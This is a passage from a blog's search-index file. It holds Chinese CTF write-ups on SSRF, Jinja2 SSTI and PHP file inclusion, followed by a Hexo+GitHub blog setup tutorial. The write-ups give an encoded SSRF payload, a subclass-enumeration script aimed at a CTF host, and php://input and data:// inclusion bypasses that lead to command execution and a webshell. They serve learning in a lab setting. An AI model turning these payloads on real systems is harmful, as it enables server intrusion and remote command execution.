title="题解"></a>题解</h3><p>首先本地构造一个文件，让他跳转到127.0.0.1，用来伪造请求</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$out = &quot;GET /flag.php HTTP/1.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Host: 127.0.0.1\r\n&quot;;</span><br><span class="line">$out .= &quot;Connection: Keep-Alive\r\n\r\n&quot;;</span><br><span class="line">echo $out;</span><br><span class="line">echo base64_encode($out)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>我要将这一段信息通过fwrite写进我们的会话中的，这些就是请求头</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: www.wrox.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</span><br><span class="line">Gecko/20050225 Firefox/1.0.1</span><br><span class="line">Connection: Keep-Alive</span><br></pre></td></tr></table></figure><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712195039783.png" alt="image-20230712195039783"></p><p>手写一个127.0.0.1的请求头格式，base64编码一下就好</p><p><img src="/2023/07/22/SSRF%20%20web351-/1/hexoblog/img/image-20230712201519214.png" alt="image-20230712201519214"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload：？host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBLZWVwLUFsaXZlDQoNCg==</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HNCTF 2022 WEEK2  ez_SSTI</title>
      <link href="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/"/>
      <url>/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/</url>
      
        <content type="html"><![CDATA[<h1 id="HNCTF-2022-WEEK2-ez-SSTI"><a href="#HNCTF-2022-WEEK2-ez-SSTI" class="headerlink" title="HNCTF 2022 WEEK2  ez_SSTI"></a>HNCTF 2022 WEEK2  ez_SSTI</h1><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721095059045-1700990353927-179-1700994545908-153.png"></p><h1 id="WELCOME-TO-HNCTF"><a href="#WELCOME-TO-HNCTF" class="headerlink" title="WELCOME TO HNCTF"></a>WELCOME TO HNCTF</h1><p>今天来做一下<strong>WELCOME TO HNCTF</strong></p><p>打开题目有一个链接，打开一看，跳转到别的地方去了，测试了一下，存在ssti注入漏洞</p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721095310676-1700990353927-180-1700994545908-155.png"></p><p>跑出来了所有的类</p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721100049475-1700990353927-181-1700994545908-154.png"></p><p>我们去找我们需要用到的os模块在第几个，用脚本去跑</p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721100029882-1700990353927-182-1700994545908-156.png"></p><p>附跑ssti模块的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url = <span class="string">&quot;http://node2.anna.nssctf.cn:28081/?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    res = requests.get(url=url, headers=headers)</span><br><span class="line">    <span class="comment">#print(res.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> res.text:    //想利用的模块名可以换</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接这里用os模块中的popen()来执行命令</p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721101152276-1700990353927-184-1700994545908-157.png"></p><p><img src="/2023/07/21/HNCTF%202022%20WEEK2%20%20ez_SSTI/image/image-20230721101047957-1700990353927-183-1700994545908-158.png"></p><p>总结：一些基础魔术方法的利用，未发现过滤，基础题</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Php_include</title>
      <link href="/2023/07/20/php-include/"/>
      <url>/2023/07/20/php-include/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看源码，绕过两个函数拿到动态flag，一个比较简单的文件包含</p><p>先看第一个函数<strong>strstr（）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、strstr() 函数搜索一个字符串在另一个字符串中的第一次出现。如果是，返回字符串及剩余部分，否则返回false。</span><br><span class="line"><span class="number">2</span>、找到所搜索的字符串，则该函数返回第一次匹配的字符串的地址；</span><br></pre></td></tr></table></figure><p>str_replace()函数</p><p>定义和用法：<br> <strong>以其它字符替换字符串中的一些字符（区分大小写）</strong><br> 语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str_replace(find,replace,string,count)</span><br></pre></td></tr></table></figure><p> find,必需，要查找的值<br> replace，必需，要替换的值<br> string，必需，被搜索的字符串<br> count，可选，替换次数</p><p>在这个题目中，就是匹配page变量中的php:&#x2F;&#x2F;替换为空</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;     <span class="comment">//查找page中的php：//，若存在则返回为空</span></span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>); <span class="comment">//匹配page变量中的php://替换为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="方法1（大小写绕过）："><a href="#方法1（大小写绕过）：" class="headerlink" title="方法1（大小写绕过）："></a><strong>方法1（大小写绕过）：</strong></h2><p>利用php伪协议大小写绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=PHP://input</span><br></pre></td></tr></table></figure><p>先get传进去</p><p><img src="/2023/07/20/php-include/image/image-20230720200207233-1700990453114-251.png"></p><p>之后写命令执行</p><p><img src="/2023/07/20/php-include/image/image-20230720200246031-1700990453114-252.png"></p><h2 id="方法2（data-上传木马）"><a href="#方法2（data-上传木马）" class="headerlink" title="方法2（data:&#x2F;&#x2F;上传木马）"></a>方法2（data:&#x2F;&#x2F;上传木马）</h2><p>第一种链接方式：</p><p><img src="/2023/07/20/php-include/image/image-20230720201235539-1700990453114-253.png"></p><p><img src="/2023/07/20/php-include/image/image-20230720201155971-1700990453116-255.png"></p><p>第二种链接方式：</p><p><img src="/2023/07/20/php-include/image/image-20230720201719427-1700990453116-254.png"></p><p>真的服了真个题了，那个base64编码再连蚁剑，那个密码1和a我都试了就是不行，用cxk就可以，妥妥的小黑子</p><p>大概跟base64编码有问题，以后面留长一点点，长记性</p><h2 id="方法3（data-命令执行）"><a href="#方法3（data-命令执行）" class="headerlink" title="方法3（data:&#x2F;&#x2F;命令执行）"></a>方法3（data:&#x2F;&#x2F;命令执行）</h2><p>只是data:&#x2F;&#x2F;协议的其中一个用法</p><p>data:&#x2F;&#x2F;协议跟php:&#x2F;&#x2F;input类似，可以让用户来控制输入流，当他与<strong>包含函数</strong>时，用户输入的data:&#x2F;&#x2F;流会被<strong>当做PHP代码执行</strong></p><p>构造方式跟input一样，不过变成了GET传参 </p><p><img src="/2023/07/20/php-include/image/image-20230720203539785-1700990453116-256.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+Github博客搭建教程（个人操作过程）</title>
      <link href="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/"/>
      <url>/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-Github博客搭建教程（个人操作过程）"><a href="#Hexo-Github博客搭建教程（个人操作过程）" class="headerlink" title="Hexo+Github博客搭建教程（个人操作过程）"></a><a href="https://so.csdn.net/so/search?q=Hexo&spm=1001.2101.3001.7020">Hexo</a>+Github博客搭建教程（个人操作过程）</h1><p>最近自己尝试利用hexo+github搭建了blog，来记录一下过程</p><p>##一、准备环境</p><h2 id="1、node环境"><a href="#1、node环境" class="headerlink" title="1、node环境"></a>1、node环境</h2><p>首先，安装 nodejs， 因为Hexo是基于 Node.js 驱动的一款博客框架。</p><p><strong><a href="http://nodejs.cn/">http://nodejs.cn</a></strong> </p><h2 id="2、git-环境"><a href="#2、git-环境" class="headerlink" title="2、git 环境"></a>2、git 环境</h2><p>然后，安装git, 一个分布式版本控制系统，用于项目的版本控制管理，作者是 Linux 之父。</p><p>⭐Git（官网）<strong><a href="https://git-scm.com/">https://git-scm.com/</a></strong></p><p>太慢的话可以自行找资源</p><pre><code>安装过程一路next就行（安装路径可改）两者安装完成之后，右击此电脑&gt;属性&gt;高级系统设置&gt;环境变量&gt;系统变量下的Path 可以看到两者已自动修改了环境变量，这是我们可以通过cmd命令（win+r后输入cmd）查看两者版本。(确认是否安装成功及可以使用) 查看Node.js版本命令：node -v 查看Git版本命令：git --version</code></pre><h2 id="3-之后进入GitHub创建一个仓库"><a href="#3-之后进入GitHub创建一个仓库" class="headerlink" title="3.之后进入GitHub创建一个仓库"></a>3.之后进入GitHub创建一个仓库</h2><blockquote><p><strong>确认注册后会让用户选择公有还是私有仓库(私有的个人仓库好像需要Money好像是每月7美金)</strong><br><strong>个人博客的话直接选免费的就行了</strong><br><strong>注意仓库的取名格式：用户名.github.io(这将是以后的访问域名)</strong></p></blockquote><blockquote><p><strong>到这里代表我们Github账号以及仓库都已经创建完毕</strong><br><strong>可以把下面这段仓库的地址复制下来留着后面配置时会用到</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716091944628-1700990345403-145-1700994540501-119.png"></p><h2 id="4-接下来进入本地配置安装Hexo"><a href="#4-接下来进入本地配置安装Hexo" class="headerlink" title="4. 接下来进入本地配置安装Hexo"></a>4. 接下来进入本地配置安装Hexo</h2><p><strong>在磁盘中创建一个用来存放Github本地仓库文件的目录(可自定义目录存放，顾名思义blog&#x3D;&#x3D;博客)</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092108512-1700990345403-147-1700994540501-120.png"></p><p>选中创建的目录(文件夹)右键选择使用Gti Bash Here打开Git命令窗口(这就是开始安装的Git工具，现在开始使用)<br>也可以使用Windows的cmd命令行(不推荐)<br>(因为是从国外服务器下载，受网络的影响比较大，有可能会出现异常，所以我们需要连接国内淘宝官方的服务器来进行)<br>输入命令：npm install -g cnpm –registry&#x3D;<a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a><br>注：之后再次使用命令则是以cnpm开头~而不是npm<br><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092323573-1700990345403-146-1700994540501-122.png"></p><blockquote><p><strong>正式开始安装hexo</strong><br><strong>输入命令：cnpm install -g hexo-cli</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092359590-1700990345403-148-1700994540501-121.png"></p><blockquote><p><strong>之后就是初始化Hexo</strong><br><strong>输入命令：hexo init</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092518819-1700990345403-149-1700994540501-123.png"></p><p><strong>这时我们创建的目录(文件夹)下已经多出许多文件</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092548657-1700990345403-150-1700994540501-124.png"></p><p>新建完成后，指定文件夹Hexo目录下有：</p><pre><code>node_modules: 依赖包public：存放生成的页面scaffolds：生成文章的一些模板source：用来存放你的文章themes：主题**_config.yml: 博客的配置文件**</code></pre><p>这样本地的网站配置也弄好啦，输入hexo g生成静态网页，然后输入hexo s打开本地服务器，</p><blockquote><p><strong>这时启动hexo之后在浏览器输入localhost:4000就可以在本地浏览博客(自带一篇Hello World博客)</strong><br><strong>输入命令：hexo s</strong><br><strong>关闭hexo ctrl + c</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092739503-1700990345403-152-1700994540501-125.png"></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716092810228-1700990345403-153-1700994540501-126.png"></p><h2 id="5-设置ssh"><a href="#5-设置ssh" class="headerlink" title="5. 设置ssh"></a>5. 设置ssh</h2><blockquote><p><strong>生成sshkey</strong><br><strong>输入命令：cd ~&#x2F;.ssh进入.ssh文件</strong></p><p><strong>输入命令：ssh-keygen -t rsa -C ‘注册时的邮箱地址’</strong> </p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716093006803-1700990345403-155-1700994540501-127.png"></p><p><strong>此时我们去查看C盘目录(此文件夹所在C:\用户\用户名目录下)</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716093119089-1700990345403-154-1700994540501-128.png"></p><p><strong>使用记事本打开id_rsa.put文件并复制生成的key</strong></p><p><strong>在已登陆的Github主页点击右侧头像 》 Settings设置</strong></p><p>再点击SSH and GPG keys 》 New SSH key</p><p><strong>将刚刚在.ssh目录下所复制id_rsa.pub文件中的信息复制进key(注意空格)，在给它取个名字(随意)</strong></p><blockquote><p><strong>这里需要在本地进行验证一次</strong><br><strong>输入命令：ssh -T <a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#x6f;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#x62;&#46;&#x63;&#x6f;&#109;</a> 并且输入yes之后，行末尾会显示你的用户名</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716093403459-1700990345403-151-1700994540501-129.png"></p></blockquote><p><strong>绑定成功并且会邮箱收到邮件</strong></p><blockquote><p><strong>接着在本地绑定与Github的用户名和邮箱</strong><br><strong>输入命令：git config –global user.name “注册时用户名”</strong><br><strong>输入命令：git config –global user.email “注册时邮箱”</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716093550811-1700990345403-156-1700994540501-130.png"></p><h2 id="6-上传测试博客"><a href="#6-上传测试博客" class="headerlink" title="6. 上传测试博客"></a>6. 上传测试博客</h2><blockquote><p>打开并修改本地仓库目录下_config.yml文件</p></blockquote><blockquote><p><strong>在文件的末尾修改(repository属性的地址就是之前创建仓库后所保存的http地址)</strong><br>deploy:<br>type: git<br>repository: <a href="https://github.com/%E7%94%A8%E6%88%B7%E5%90%8D/%E7%94%A8%E6%88%B7%E5%90%8D.github.io.git">https://github.com/用户名/用户名.github.io.git</a></p><p>branch: master</p></blockquote><blockquote><p><strong>此时需要安装一个上传工具</strong><br><strong>输入命令：cnpm install hexo-deployer-git</strong></p></blockquote><blockquote><p><strong>可以新建一篇测试文章(不新建的话也会有一篇自带的Hello World文章)</strong><br><strong>输入命令：hexo new “文章名称”</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716094542664-1700990345403-157-1700994540501-131.png"></p><blockquote><p><strong>新建文章之后需要生成一遍文件</strong><br><strong>输入命令：hexo g</strong></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716094611137-1700990345403-158-1700994540501-133.png"></p></blockquote><blockquote><p><strong>新建文章后可在本地先预览一遍</strong><br><strong>输入命令：hexo s浏览器输入：localhost:4000(ctrl + c 关闭)</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/20200331230142753-1700990345403-159-1700994540501-132.png"></p><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716094741275-1700990345404-161-1700994540501-134.png"></p><blockquote><p><strong>最后直接部署到Github就可以啦</strong><br><strong>输入命令：hexo d</strong></p></blockquote><p><img src="/2023/07/17/Hexo-Github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%AA%E4%BA%BA%E6%93%8D%E4%BD%9C%E8%BF%87%E7%A8%8B%EF%BC%89/image/image-20230716095642961-1700990345404-160-1700994540501-135.png"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
